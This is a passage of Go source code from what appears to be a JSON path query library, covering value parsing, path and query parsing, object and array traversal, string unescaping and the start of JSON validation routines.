			if (json[i] >= '0' && json[i] <= '9') || json[i] == '-' {
				value.Type = Number
				value.Raw, value.Num = tonum(json[i:])
				value.Str = ""
			} else {
				continue
			}
		case '{', '[':
			value.Type = JSON
			value.Raw = squash(json[i:])
			value.Str, value.Num = "", 0
		case 'n':
			value.Type = Null
			value.Raw = tolit(json[i:])
			value.Str, value.Num = "", 0
		case 't':
			value.Type = True
			value.Raw = tolit(json[i:])
			value.Str, value.Num = "", 0
		case 'f':
			value.Type = False
			value.Raw = tolit(json[i:])
			value.Str, value.Num = "", 0
		case '"':
			value.Type = String
			value.Raw, value.Str = tostr(json[i:])
			value.Num = 0
		}
		i += len(value.Raw) - 1

		if r.vc == '{' {
			if count%2 == 0 {
				key = value
			} else {
				if valueize {
					if _, ok := r.oi[key.Str]; !ok {
						r.oi[key.Str] = value.Value()
					}
				} else {
					if _, ok := r.o[key.Str]; !ok {
						r.o[key.Str] = value
					}
				}
			}
			count++
		} else {
			if valueize {
				r.ai = append(r.ai, value.Value())
			} else {
				r.a = append(r.a, value)
			}
		}
	}
end:
	return
}

func Parse(json string) Result {
	var value Result
	for i := 0; i < len(json); i++ {
		if json[i] == '{' || json[i] == '[' {
			value.Type = JSON
			value.Raw = json[i:]
			break
		}
		if json[i] <= ' ' {
			continue
		}
		switch json[i] {
		default:
			if (json[i] >= '0' && json[i] <= '9') || json[i] == '-' {
				value.Type = Number
				value.Raw, value.Num = tonum(json[i:])
			} else {
				return Result{}
			}
		case 'n':
			value.Type = Null
			value.Raw = tolit(json[i:])
		case 't':
			value.Type = True
			value.Raw = tolit(json[i:])
		case 'f':
			value.Type = False
			value.Raw = tolit(json[i:])
		case '"':
			value.Type = String
			value.Raw, value.Str = tostr(json[i:])
		}
		break
	}
	return value
}

func ParseBytes(json []byte) Result {
	return Parse(string(json))
}

func squash(json string) string {
	var i, depth int
	if json[0] != '"' {
		i, depth = 1, 1
	}
	for ; i < len(json); i++ {
		if json[i] >= '"' && json[i] <= '}' {
			switch json[i] {
			case '"':
				i++
				s2 := i
				for ; i < len(json); i++ {
					if json[i] > '\\' {
						continue
					}
					if json[i] == '"' {
						if json[i-1] == '\\' {
							n := 0
							for j := i - 2; j > s2-1; j-- {
								if json[j] != '\\' {
									break
								}
								n++
							}
							if n%2 == 0 {
								continue
							}
						}
						break
					}
				}
				if depth == 0 {
					if i >= len(json) {
						return json
					}
					return json[:i+1]
				}
			case '{', '[', '(':
				depth++
			case '}', ']', ')':
				depth--
				if depth == 0 {
					return json[:i+1]
				}
			}
		}
	}
	return json
}

func tonum(json string) (raw string, num float64) {
	for i := 1; i < len(json); i++ {
		if json[i] <= '-' {
			if json[i] <= ' ' || json[i] == ',' {
				raw = json[:i]
				num, _ = strconv.ParseFloat(raw, 64)
				return
			}
			continue
		}
		if json[i] < ']' {
			continue
		}
		if json[i] == 'e' || json[i] == 'E' {
			continue
		}
		raw = json[:i]
		num, _ = strconv.ParseFloat(raw, 64)
		return
	}
	raw = json
	num, _ = strconv.ParseFloat(raw, 64)
	return
}

func tolit(json string) (raw string) {
	for i := 1; i < len(json); i++ {
		if json[i] < 'a' || json[i] > 'z' {
			return json[:i]
		}
	}
	return json
}

func tostr(json string) (raw string, str string) {
	for i := 1; i < len(json); i++ {
		if json[i] > '\\' {
			continue
		}
		if json[i] == '"' {
			return json[:i+1], json[1:i]
		}
		if json[i] == '\\' {
			i++
			for ; i < len(json); i++ {
				if json[i] > '\\' {
					continue
				}
				if json[i] == '"' {
					if json[i-1] == '\\' {
						n := 0
						for j := i - 2; j > 0; j-- {
							if json[j] != '\\' {
								break
							}
							n++
						}
						if n%2 == 0 {
							continue
						}
					}
					return json[:i+1], unescape(json[1:i])
				}
			}
			var ret string
			if i+1 < len(json) {
				ret = json[:i+1]
			} else {
				ret = json[:i]
			}
			return ret, unescape(json[1:i])
		}
	}
	return json, json[1:]
}

func (t Result) Exists() bool {
	return t.Type != Null || len(t.Raw) != 0
}

func (t Result) Value() interface{} {
	if t.Type == String {
		return t.Str
	}
	switch t.Type {
	default:
		return nil
	case False:
		return false
	case Number:
		return t.Num
	case JSON:
		r := t.arrayOrMap(0, true)
		if r.vc == '{' {
			return r.oi
		} else if r.vc == '[' {
			return r.ai
		}
		return nil
	case True:
		return true
	}
}

func parseString(json string, i int) (int, string, bool, bool) {
	var s = i
	for ; i < len(json); i++ {
		if json[i] > '\\' {
			continue
		}
		if json[i] == '"' {
			return i + 1, json[s-1 : i+1], false, true
		}
		if json[i] == '\\' {
			i++
			for ; i < len(json); i++ {
				if json[i] > '\\' {
					continue
				}
				if json[i] == '"' {
					if json[i-1] == '\\' {
						n := 0
						for j := i - 2; j > 0; j-- {
							if json[j] != '\\' {
								break
							}
							n++
						}
						if n%2 == 0 {
							continue
						}
					}
					return i + 1, json[s-1 : i+1], true, true
				}
			}
			break
		}
	}
	return i, json[s-1:], false, false
}

func parseNumber(json string, i int) (int, string) {
	var s = i
	i++
	for ; i < len(json); i++ {
		if json[i] <= ' ' || json[i] == ',' || json[i] == ']' ||
			json[i] == '}' {
			return i, json[s:i]
		}
	}
	return i, json[s:]
}

func parseLiteral(json string, i int) (int, string) {
	var s = i
	i++
	for ; i < len(json); i++ {
		if json[i] < 'a' || json[i] > 'z' {
			return i, json[s:i]
		}
	}
	return i, json[s:]
}

func parseArrayPath(path string) (r arrayPathResult) {
	for i := 0; i < len(path); i++ {
		if path[i] == '|' {
			r.part = path[:i]
			r.pipe = path[i+1:]
			r.piped = true
			return
		}
		if path[i] == '.' {
			r.part = path[:i]
			if !r.arrch && i < len(path)-1 && isDotPiperChar(path[i+1]) {
				r.pipe = path[i+1:]
				r.piped = true
			} else {
				r.path = path[i+1:]
				r.more = true
			}
			return
		}
		if path[i] == '#' {
			r.arrch = true
			if i == 0 && len(path) > 1 {
				if path[1] == '.' {
					r.alogok = true
					r.alogkey = path[2:]
					r.path = path[:1]
				} else if path[1] == '[' || path[1] == '(' {
					// query
					r.query.on = true
					qpath, op, value, _, fi, vesc, ok :=
						parseQuery(path[i:])
					if !ok {
						// bad query, end now
						break
					}
					if len(value) > 2 && value[0] == '"' &&
						value[len(value)-1] == '"' {
						value = value[1 : len(value)-1]
						if vesc {
							value = unescape(value)
						}
					}
					r.query.path = qpath
					r.query.op = op
					r.query.value = value

					i = fi - 1
					if i+1 < len(path) && path[i+1] == '#' {
						r.query.all = true
					}
				}
			}
			continue
		}
	}
	r.part = path
	r.path = ""
	return
}

func parseQuery(query string) (
	path, op, value, remain string, i int, vesc, ok bool,
) {
	if len(query) < 2 || query[0] != '#' ||
		(query[1] != '(' && query[1] != '[') {
		return "", "", "", "", i, false, false
	}
	i = 2
	j := 0
	depth := 1
	for ; i < len(query); i++ {
		if depth == 1 && j == 0 {
			switch query[i] {
			case '!', '=', '<', '>', '%':
				j = i
				continue
			}
		}
		if query[i] == '\\' {
			i++
		} else if query[i] == '[' || query[i] == '(' {
			depth++
		} else if query[i] == ']' || query[i] == ')' {
			depth--
			if depth == 0 {
				break
			}
		} else if query[i] == '"' {
			i++
			for ; i < len(query); i++ {
				if query[i] == '\\' {
					vesc = true
					i++
				} else if query[i] == '"' {
					break
				}
			}
		}
	}
	if depth > 0 {
		return "", "", "", "", i, false, false
	}
	if j > 0 {
		path = trim(query[2:j])
		value = trim(query[j:i])
		remain = query[i+1:]
		var opsz int
		switch {
		case len(value) == 1:
			opsz = 1
		case value[0] == '!' && value[1] == '=':
			opsz = 2
		case value[0] == '!' && value[1] == '%':
			opsz = 2
		case value[0] == '<' && value[1] == '=':
			opsz = 2
		case value[0] == '>' && value[1] == '=':
			opsz = 2
		case value[0] == '=' && value[1] == '=':
			value = value[1:]
			opsz = 1
		case value[0] == '<':
			opsz = 1
		case value[0] == '>':
			opsz = 1
		case value[0] == '=':
			opsz = 1
		case value[0] == '%':
			opsz = 1
		}
		op = value[:opsz]
		value = trim(value[opsz:])
	} else {
		path = trim(query[2:i])
		remain = query[i+1:]
	}
	return path, op, value, remain, i + 1, vesc, true
}

func trim(s string) string {
left:
	if len(s) > 0 && s[0] <= ' ' {
		s = s[1:]
		goto left
	}
right:
	if len(s) > 0 && s[len(s)-1] <= ' ' {
		s = s[:len(s)-1]
		goto right
	}
	return s
}

func isDotPiperChar(c byte) bool {
	return !DisableModifiers && (c == '@' || c == '[' || c == '{')
}

type objectPathResult struct {
	part  string
	path  string
	pipe  string
	piped bool
	wild  bool
	more  bool
}

func parseObjectPath(path string) (r objectPathResult) {
	for i := 0; i < len(path); i++ {
		if path[i] == '|' {
			r.part = path[:i]
			r.pipe = path[i+1:]
			r.piped = true
			return
		}
		if path[i] == '.' {
			r.part = path[:i]
			if i < len(path)-1 && isDotPiperChar(path[i+1]) {
				r.pipe = path[i+1:]
				r.piped = true
			} else {
				r.path = path[i+1:]
				r.more = true
			}
			return
		}
		if path[i] == '*' || path[i] == '?' {
			r.wild = true
			continue
		}
		if path[i] == '\\' {
			epart := []byte(path[:i])
			i++
			if i < len(path) {
				epart = append(epart, path[i])
				i++
				for ; i < len(path); i++ {
					if path[i] == '\\' {
						i++
						if i < len(path) {
							epart = append(epart, path[i])
						}
						continue
					} else if path[i] == '.' {
						r.part = string(epart)
						if i < len(path)-1 && isDotPiperChar(path[i+1]) {
							r.pipe = path[i+1:]
							r.piped = true
						} else {
							r.path = path[i+1:]
						}
						r.more = true
						return
					} else if path[i] == '|' {
						r.part = string(epart)
						r.pipe = path[i+1:]
						r.piped = true
						return
					} else if path[i] == '*' || path[i] == '?' {
						r.wild = true
					}
					epart = append(epart, path[i])
				}
			}
			r.part = string(epart)
			return
		}
	}
	r.part = path
	return
}

func parseSquash(json string, i int) (int, string) {
	s := i
	i++
	depth := 1
	for ; i < len(json); i++ {
		if json[i] >= '"' && json[i] <= '}' {
			switch json[i] {
			case '"':
				i++
				s2 := i
				for ; i < len(json); i++ {
					if json[i] > '\\' {
						continue
					}
					if json[i] == '"' {
						if json[i-1] == '\\' {
							n := 0
							for j := i - 2; j > s2-1; j-- {
								if json[j] != '\\' {
									break
								}
								n++
							}
							if n%2 == 0 {
								continue
							}
						}
						break
					}
				}
			case '{', '[', '(':
				depth++
			case '}', ']', ')':
				depth--
				if depth == 0 {
					i++
					return i, json[s:i]
				}
			}
		}
	}
	return i, json[s:]
}

func parseObject(c *parseContext, i int, path string) (int, bool) {
	var pmatch, kesc, vesc, ok, hit bool
	var key, val string
	rp := parseObjectPath(path)
	if !rp.more && rp.piped {
		c.pipe = rp.pipe
		c.piped = true
	}
	for i < len(c.json) {
		for ; i < len(c.json); i++ {
			if c.json[i] == '"' {
				i++
				var s = i
				for ; i < len(c.json); i++ {
					if c.json[i] > '\\' {
						continue
					}
					if c.json[i] == '"' {
						i, key, kesc, ok = i+1, c.json[s:i], false, true
						goto parseKeyStringDone
					}
					if c.json[i] == '\\' {
						i++
						for ; i < len(c.json); i++ {
							if c.json[i] > '\\' {
								continue
							}
							if c.json[i] == '"' {
								if c.json[i-1] == '\\' {
									n := 0
									for j := i - 2; j > 0; j-- {
										if c.json[j] != '\\' {
											break
										}
										n++
									}
									if n%2 == 0 {
										continue
									}
								}
								i, key, kesc, ok = i+1, c.json[s:i], true, true
								goto parseKeyStringDone
							}
						}
						break
					}
				}
				key, kesc, ok = c.json[s:], false, false
			parseKeyStringDone:
				break
			}
			if c.json[i] == '}' {
				return i + 1, false
			}
		}
		if !ok {
			return i, false
		}
		if rp.wild {
			if kesc {
				pmatch = Match(unescape(key), rp.part)
			} else {
				pmatch = Match(key, rp.part)
			}
		} else {
			if kesc {
				pmatch = rp.part == unescape(key)
			} else {
				pmatch = rp.part == key
			}
		}
		hit = pmatch && !rp.more
		for ; i < len(c.json); i++ {
			switch c.json[i] {
			default:
				continue
			case '"':
				i++
				i, val, vesc, ok = parseString(c.json, i)
				if !ok {
					return i, false
				}
				if hit {
					if vesc {
						c.value.Str = unescape(val[1 : len(val)-1])
					} else {
						c.value.Str = val[1 : len(val)-1]
					}
					c.value.Raw = val
					c.value.Type = String
					return i, true
				}
			case '{':
				if pmatch && !hit {
					i, hit = parseObject(c, i+1, rp.path)
					if hit {
						return i, true
					}
				} else {
					i, val = parseSquash(c.json, i)
					if hit {
						c.value.Raw = val
						c.value.Type = JSON
						return i, true
					}
				}
			case '[':
				if pmatch && !hit {
					i, hit = parseArray(c, i+1, rp.path)
					if hit {
						return i, true
					}
				} else {
					i, val = parseSquash(c.json, i)
					if hit {
						c.value.Raw = val
						c.value.Type = JSON
						return i, true
					}
				}
			case '-', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9':
				i, val = parseNumber(c.json, i)
				if hit {
					c.value.Raw = val
					c.value.Type = Number
					c.value.Num, _ = strconv.ParseFloat(val, 64)
					return i, true
				}
			case 't', 'f', 'n':
				vc := c.json[i]
				i, val = parseLiteral(c.json, i)
				if hit {
					c.value.Raw = val
					switch vc {
					case 't':
						c.value.Type = True
					case 'f':
						c.value.Type = False
					}
					return i, true
				}
			}
			break
		}
	}
	return i, false
}
func queryMatches(rp *arrayPathResult, value Result) bool {
	rpv := rp.query.value
	if len(rpv) > 0 && rpv[0] == '~' {
		// convert to bool
		rpv = rpv[1:]
		if value.Bool() {
			value = Result{Type: True}
		} else {
			value = Result{Type: False}
		}
	}
	if !value.Exists() {
		return false
	}
	if rp.query.op == "" {
		return true
	}
	switch value.Type {
	case String:
		switch rp.query.op {
		case "=":
			return value.Str == rpv
		case "!=":
			return value.Str != rpv
		case "<":
			return value.Str < rpv
		case "<=":
			return value.Str <= rpv
		case ">":
			return value.Str > rpv
		case ">=":
			return value.Str >= rpv
		case "%":
			return Match(value.Str, rpv)
		case "!%":
			return !Match(value.Str, rpv)
		}
	case Number:
		rpvn, _ := strconv.ParseFloat(rpv, 64)
		switch rp.query.op {
		case "=":
			return value.Num == rpvn
		case "!=":
			return value.Num != rpvn
		case "<":
			return value.Num < rpvn
		case "<=":
			return value.Num <= rpvn
		case ">":
			return value.Num > rpvn
		case ">=":
			return value.Num >= rpvn
		}
	case True:
		switch rp.query.op {
		case "=":
			return rpv == "true"
		case "!=":
			return rpv != "true"
		case ">":
			return rpv == "false"
		case ">=":
			return true
		}
	case False:
		switch rp.query.op {
		case "=":
			return rpv == "false"
		case "!=":
			return rpv != "false"
		case "<":
			return rpv == "true"
		case "<=":
			return true
		}
	}
	return false
}
func parseArray(c *parseContext, i int, path string) (int, bool) {
	var pmatch, vesc, ok, hit bool
	var val string
	var h int
	var alog []int
	var partidx int
	var multires []byte
	rp := parseArrayPath(path)
	if !rp.arrch {
		n, ok := parseUint(rp.part)
		if !ok {
			partidx = -1
		} else {
			partidx = int(n)
		}
	}
	if !rp.more && rp.piped {
		c.pipe = rp.pipe
		c.piped = true
	}

	procQuery := func(qval Result) bool {
		if rp.query.all {
			if len(multires) == 0 {
				multires = append(multires, '[')
			}
		}
		var res Result
		if qval.Type == JSON {
			res = qval.Get(rp.query.path)
		} else {
			if rp.query.path != "" {
				return false
			}
			res = qval
		}
		if queryMatches(&rp, res) {
			if rp.more {
				left, right, ok := splitPossiblePipe(rp.path)
				if ok {
					rp.path = left
					c.pipe = right
					c.piped = true
				}
				res = qval.Get(rp.path)
			} else {
				res = qval
			}
			if rp.query.all {
				raw := res.Raw
				if len(raw) == 0 {
					raw = res.String()
				}
				if raw != "" {
					if len(multires) > 1 {
						multires = append(multires, ',')
					}
					multires = append(multires, raw...)
				}
			} else {
				c.value = res
				return true
			}
		}
		return false
	}
	for i < len(c.json)+1 {
		if !rp.arrch {
			pmatch = partidx == h
			hit = pmatch && !rp.more
		}
		h++
		if rp.alogok {
			alog = append(alog, i)
		}
		for ; ; i++ {
			var ch byte
			if i > len(c.json) {
				break
			} else if i == len(c.json) {
				ch = ']'
			} else {
				ch = c.json[i]
			}
			switch ch {
			default:
				continue
			case '"':
				i++
				i, val, vesc, ok = parseString(c.json, i)
				if !ok {
					return i, false
				}
				if rp.query.on {
					var qval Result
					if vesc {
						qval.Str = unescape(val[1 : len(val)-1])
					} else {
						qval.Str = val[1 : len(val)-1]
					}
					qval.Raw = val
					qval.Type = String
					if procQuery(qval) {
						return i, true
					}
				} else if hit {
					if rp.alogok {
						break
					}
					if vesc {
						c.value.Str = unescape(val[1 : len(val)-1])
					} else {
						c.value.Str = val[1 : len(val)-1]
					}
					c.value.Raw = val
					c.value.Type = String
					return i, true
				}
			case '{':
				if pmatch && !hit {
					i, hit = parseObject(c, i+1, rp.path)
					if hit {
						if rp.alogok {
							break
						}
						return i, true
					}
				} else {
					i, val = parseSquash(c.json, i)
					if rp.query.on {
						if procQuery(Result{Raw: val, Type: JSON}) {
							return i, true
						}
					} else if hit {
						if rp.alogok {
							break
						}
						c.value.Raw = val
						c.value.Type = JSON
						return i, true
					}
				}
			case '[':
				if pmatch && !hit {
					i, hit = parseArray(c, i+1, rp.path)
					if hit {
						if rp.alogok {
							break
						}
						return i, true
					}
				} else {
					i, val = parseSquash(c.json, i)
					if rp.query.on {
						if procQuery(Result{Raw: val, Type: JSON}) {
							return i, true
						}
					} else if hit {
						if rp.alogok {
							break
						}
						c.value.Raw = val
						c.value.Type = JSON
						return i, true
					}
				}
			case '-', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9':
				i, val = parseNumber(c.json, i)
				if rp.query.on {
					var qval Result
					qval.Raw = val
					qval.Type = Number
					qval.Num, _ = strconv.ParseFloat(val, 64)
					if procQuery(qval) {
						return i, true
					}
				} else if hit {
					if rp.alogok {
						break
					}
					c.value.Raw = val
					c.value.Type = Number
					c.value.Num, _ = strconv.ParseFloat(val, 64)
					return i, true
				}
			case 't', 'f', 'n':
				vc := c.json[i]
				i, val = parseLiteral(c.json, i)
				if rp.query.on {
					var qval Result
					qval.Raw = val
					switch vc {
					case 't':
						qval.Type = True
					case 'f':
						qval.Type = False
					}
					if procQuery(qval) {
						return i, true
					}
				} else if hit {
					if rp.alogok {
						break
					}
					c.value.Raw = val
					switch vc {
					case 't':
						c.value.Type = True
					case 'f':
						c.value.Type = False
					}
					return i, true
				}
			case ']':
				if rp.arrch && rp.part == "#" {
					if rp.alogok {
						left, right, ok := splitPossiblePipe(rp.alogkey)
						if ok {
							rp.alogkey = left
							c.pipe = right
							c.piped = true
						}
						var jsons = make([]byte, 0, 64)
						jsons = append(jsons, '[')
						for j, k := 0, 0; j < len(alog); j++ {
							idx := alog[j]
							for idx < len(c.json) {
								switch c.json[idx] {
								case ' ', '\t', '\r', '\n':
									idx++
									continue
								}
								break
							}
							if idx < len(c.json) && c.json[idx] != ']' {
								_, res, ok := parseAny(c.json, idx, true)
								if ok {
									res := res.Get(rp.alogkey)
									if res.Exists() {
										if k > 0 {
											jsons = append(jsons, ',')
										}
										raw := res.Raw
										if len(raw) == 0 {
											raw = res.String()
										}
										jsons = append(jsons, []byte(raw)...)
										k++
									}
								}
							}
						}
						jsons = append(jsons, ']')
						c.value.Type = JSON
						c.value.Raw = string(jsons)
						return i + 1, true
					}
					if rp.alogok {
						break
					}

					c.value.Type = Number
					c.value.Num = float64(h - 1)
					c.value.Raw = strconv.Itoa(h - 1)
					c.calcd = true
					return i + 1, true
				}
				if !c.value.Exists() {
					if len(multires) > 0 {
						c.value = Result{
							Raw:  string(append(multires, ']')),
							Type: JSON,
						}
					} else if rp.query.all {
						c.value = Result{
							Raw:  "[]",
							Type: JSON,
						}
					}
				}
				return i + 1, false
			}
			break
		}
	}
	return i, false
}

func splitPossiblePipe(path string) (left, right string, ok bool) {
	var possible bool
	for i := 0; i < len(path); i++ {
		if path[i] == '|' {
			possible = true
			break
		}
	}
	if !possible {
		return
	}

	if len(path) > 0 && path[0] == '{' {
		squashed := squash(path[1:])
		if len(squashed) < len(path)-1 {
			squashed = path[:len(squashed)+1]
			remain := path[len(squashed):]
			if remain[0] == '|' {
				return squashed, remain[1:], true
			}
		}
		return
	}

	for i := 0; i < len(path); i++ {
		if path[i] == '\\' {
			i++
		} else if path[i] == '.' {
			if i == len(path)-1 {
				return
			}
			if path[i+1] == '#' {
				i += 2
				if i == len(path) {
					return
				}
				if path[i] == '[' || path[i] == '(' {
					var start, end byte
					if path[i] == '[' {
						start, end = '[', ']'
					} else {
						start, end = '(', ')'
					}
					i++
					depth := 1
					for ; i < len(path); i++ {
						if path[i] == '\\' {
							i++
						} else if path[i] == start {
							depth++
						} else if path[i] == end {
							depth--
							if depth == 0 {
								break
							}
						} else if path[i] == '"' {
							i++
							for ; i < len(path); i++ {
								if path[i] == '\\' {
									i++
								} else if path[i] == '"' {
									break
								}
							}
						}
					}
				}
			}
		} else if path[i] == '|' {
			return path[:i], path[i+1:], true
		}
	}
	return
}

func parseSubSelectors(path string) (sels []subSelector, out string, ok bool) {
	modifer := 0
	depth := 1
	colon := 0
	start := 1
	i := 1
	pushSel := func() {
		var sel subSelector
		if colon == 0 {
			sel.path = path[start:i]
		} else {
			sel.name = path[start:colon]
			sel.path = path[colon+1 : i]
		}
		sels = append(sels, sel)
		colon = 0
		start = i + 1
	}
	for ; i < len(path); i++ {
		switch path[i] {
		case '\\':
			i++
		case '@':
			if modifer == 0 && i > 0 && (path[i-1] == '.' || path[i-1] == '|') {
				modifer = i
			}
		case ':':
			if modifer == 0 && colon == 0 && depth == 1 {
				colon = i
			}
		case ',':
			if depth == 1 {
				pushSel()
			}
		case '"':
			i++
		loop:
			for ; i < len(path); i++ {
				switch path[i] {
				case '\\':
					i++
				case '"':
					break loop
				}
			}
		case '[', '(', '{':
			depth++
		case ']', ')', '}':
			depth--
			if depth == 0 {
				pushSel()
				path = path[i+1:]
				return sels, path, true
			}
		}
	}
	return
}

func nameOfLast(path string) string {
	for i := len(path) - 1; i >= 0; i-- {
		if path[i] == '|' || path[i] == '.' {
			if i > 0 {
				if path[i-1] == '\\' {
					continue
				}
			}
			return path[i+1:]
		}
	}
	return path
}

func isSimpleName(component string) bool {
	for i := 0; i < len(component); i++ {
		if component[i] < ' ' {
			return false
		}
		switch component[i] {
		case '[', ']', '{', '}', '(', ')', '#', '|':
			return false
		}
	}
	return true
}

func appendJSONString(dst []byte, s string) []byte {
	for i := 0; i < len(s); i++ {
		if s[i] < ' ' || s[i] == '\\' || s[i] == '"' || s[i] > 126 {
			d, _ := json.Marshal(s)
			return append(dst, string(d)...)
		}
	}
	dst = append(dst, '"')
	dst = append(dst, s...)
	dst = append(dst, '"')
	return dst
}

func Get(json, path string) Result {
	if len(path) > 1 {
		if !DisableModifiers {
			if path[0] == '@' {
				var ok bool
				var npath string
				var rjson string
				npath, rjson, ok = execModifier(json, path)
				if ok {
					path = npath
					if len(path) > 0 && (path[0] == '|' || path[0] == '.') {
						res := Get(rjson, path[1:])
						res.Index = 0
						return res
					}
					return Parse(rjson)
				}
			}
		}
		if path[0] == '[' || path[0] == '{' {
			kind := path[0]
			var ok bool
			var subs []subSelector
			subs, path, ok = parseSubSelectors(path)
			if ok {
				if len(path) == 0 || (path[0] == '|' || path[0] == '.') {
					var b []byte
					b = append(b, kind)
					var i int
					for _, sub := range subs {
						res := Get(json, sub.path)
						if res.Exists() {
							if i > 0 {
								b = append(b, ',')
							}
							if kind == '{' {
								if len(sub.name) > 0 {
									if sub.name[0] == '"' && Valid(sub.name) {
										b = append(b, sub.name...)
									} else {
										b = appendJSONString(b, sub.name)
									}
								} else {
									last := nameOfLast(sub.path)
									if isSimpleName(last) {
										b = appendJSONString(b, last)
									} else {
										b = appendJSONString(b, "_")
									}
								}
								b = append(b, ':')
							}
							var raw string
							if len(res.Raw) == 0 {
								raw = res.String()
								if len(raw) == 0 {
									raw = "null"
								}
							} else {
								raw = res.Raw
							}
							b = append(b, raw...)
							i++
						}
					}
					b = append(b, kind+2)
					var res Result
					res.Raw = string(b)
					res.Type = JSON
					if len(path) > 0 {
						res = res.Get(path[1:])
					}
					res.Index = 0
					return res
				}
			}
		}
	}
	var i int
	var c = &parseContext{json: json}
	if len(path) >= 2 && path[0] == '.' && path[1] == '.' {
		c.lines = true
		parseArray(c, 0, path[2:])
	} else {
		for ; i < len(c.json); i++ {
			if c.json[i] == '{' {
				i++
				parseObject(c, i, path)
				break
			}
			if c.json[i] == '[' {
				i++
				parseArray(c, i, path)
				break
			}
		}
	}
	if c.piped {
		res := c.value.Get(c.pipe)
		res.Index = 0
		return res
	}
	fillIndex(json, c)
	return c.value
}

func GetBytes(json []byte, path string) Result {
	return getBytes(json, path)
}

func runeit(json string) rune {
	n, _ := strconv.ParseUint(json[:4], 16, 64)
	return rune(n)
}

func unescape(json string) string {
	var str = make([]byte, 0, len(json))
	for i := 0; i < len(json); i++ {
		switch {
		default:
			str = append(str, json[i])
		case json[i] < ' ':
			return string(str)
		case json[i] == '\\':
			i++
			if i >= len(json) {
				return string(str)
			}
			switch json[i] {
			default:
				return string(str)
			case '\\':
				str = append(str, '\\')
			case '/':
				str = append(str, '/')
			case 'b':
				str = append(str, '\b')
			case 'f':
				str = append(str, '\f')
			case 'n':
				str = append(str, '\n')
			case 'r':
				str = append(str, '\r')
			case 't':
				str = append(str, '\t')
			case '"':
				str = append(str, '"')
			case 'u':
				if i+5 > len(json) {
					return string(str)
				}
				r := runeit(json[i+1:])
				i += 5
				if utf16.IsSurrogate(r) {
					if len(json[i:]) >= 6 && json[i] == '\\' &&
						json[i+1] == 'u' {
						r = utf16.DecodeRune(r, runeit(json[i+2:]))
						i += 6
					}
				}
				str = append(str, 0, 0, 0, 0, 0, 0, 0, 0)
				n := utf8.EncodeRune(str[len(str)-8:], r)
				str = str[:len(str)-8+n]
				i--
			}
		}
	}
	return string(str)
}

func (t Result) Less(token Result, caseSensitive bool) bool {
	if t.Type < token.Type {
		return true
	}
	if t.Type > token.Type {
		return false
	}
	if t.Type == String {
		if caseSensitive {
			return t.Str < token.Str
		}
		return stringLessInsensitive(t.Str, token.Str)
	}
	if t.Type == Number {
		return t.Num < token.Num
	}
	return t.Raw < token.Raw
}

func stringLessInsensitive(a, b string) bool {
	for i := 0; i < len(a) && i < len(b); i++ {
		if a[i] >= 'A' && a[i] <= 'Z' {
			if b[i] >= 'A' && b[i] <= 'Z' {
				if a[i] < b[i] {
					return true
				} else if a[i] > b[i] {
					return false
				}
			} else {
				if a[i]+32 < b[i] {
					return true
				} else if a[i]+32 > b[i] {
					return false
				}
			}
		} else if b[i] >= 'A' && b[i] <= 'Z' {
			if a[i] < b[i]+32 {
				return true
			} else if a[i] > b[i]+32 {
				return false
			}
		} else {
			if a[i] < b[i] {
				return true
			} else if a[i] > b[i] {
				return false
			}
		}
	}
	return len(a) < len(b)
}

func parseAny(json string, i int, hit bool) (int, Result, bool) {
	var res Result
	var val string
	for ; i < len(json); i++ {
		if json[i] == '{' || json[i] == '[' {
			i, val = parseSquash(json, i)
			if hit {
				res.Raw = val
				res.Type = JSON
			}
			return i, res, true
		}
		if json[i] <= ' ' {
			continue
		}
		switch json[i] {
		case '"':
			i++
			var vesc bool
			var ok bool
			i, val, vesc, ok = parseString(json, i)
			if !ok {
				return i, res, false
			}
			if hit {
				res.Type = String
				res.Raw = val
				if vesc {
					res.Str = unescape(val[1 : len(val)-1])
				} else {
					res.Str = val[1 : len(val)-1]
				}
			}
			return i, res, true
		case '-', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9':
			i, val = parseNumber(json, i)
			if hit {
				res.Raw = val
				res.Type = Number
				res.Num, _ = strconv.ParseFloat(val, 64)
			}
			return i, res, true
		case 't', 'f', 'n':
			vc := json[i]
			i, val = parseLiteral(json, i)
			if hit {
				res.Raw = val
				switch vc {
				case 't':
					res.Type = True
				case 'f':
					res.Type = False
				}
				return i, res, true
			}
		}
	}
	return i, res, false
}

func validpayload(data []byte, i int) (outi int, ok bool) {
	for ; i < len(data); i++ {
		switch data[i] {
		default:
			i, ok = validany(data, i)
			if !ok {
				return i, false
			}
			for ; i < len(data); i++ {
				switch data[i] {
				default:
					return i, false
				case ' ', '\t', '\n', '\r':
					continue
				}
			}
			return i, true
		case ' ', '\t', '\n', '\r':
			continue
		}
	}
	return i, false
}
func validany(data []byte, i int) (outi int, ok bool) {
	for ; i < len(data); i++ {
		switch data[i] {
		default:
			return i, false
		case ' ', '\t', '\n', '\r':
			continue
		case '{':
			return validobject(data, i+1)
		case '[':
			return validarray(data, i+1)
		case '"':
			return validstring(data, i+1)
		case '-', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9':
			return validnumber(data, i+1)
		case 't':
			return validtrue(data, i+1)
		case 'f':
			return validfalse(data, i+1)
		case 'n':
			return validnull(data, i+1)
		}
	}
	return i, false
}
func validobject(data []byte, i int) (outi int, ok bool) {
	for ; i < len(data); i++ {
		switch data[i] {
		default:
			return i, false
		case ' ', '\t', '\n', '\r':
			continue
		case '}':
			return i + 1, true
		case '"':
		key:
			if i, ok = validstring(data, i+1); !ok {
				return i, false
			}
			if i, ok = validcolon(data, i); !ok {
				return i, false
			}
			if i, ok = validany(data, i); !ok {
				return i, false
			}
			if i, ok = validcomma(data, i, '}'); !ok {
				return i, false
			}
			if data[i] == '}' {
				return i + 1, true
			}
			i++
			for ; i < len(data); i++ {
				switch data[i] {
				default:
					return i, false
				case ' ', '\t', '\n', '\r':
					continue
				case '"':
					goto key
				}
			}
			return i, false
		}
	}
	return i, false
}
func validcolon(data []byte, i int) (outi int, ok bool) {
	for ; i < len(data); i++ {
		switch data[i] {
		default:
			return i, false
		case ' ', '\t', '\n', '\r':
			continue
		case ':':
			return i + 1, true
		}
	}
	return i, false
}
func validcomma(data []byte, i int, end byte) (outi int, ok bool) {
	for ; i < len(data); i++ {
		switch data[i] {
		default:
			return i, false
		case ' ', '\t', '\n', '\r':
			continue
		case ',':
			return i, true
		case end:
			return i, true
		}
	}
	return i, false
}
func validarray(data []byte, i int) (outi int, ok bool) {
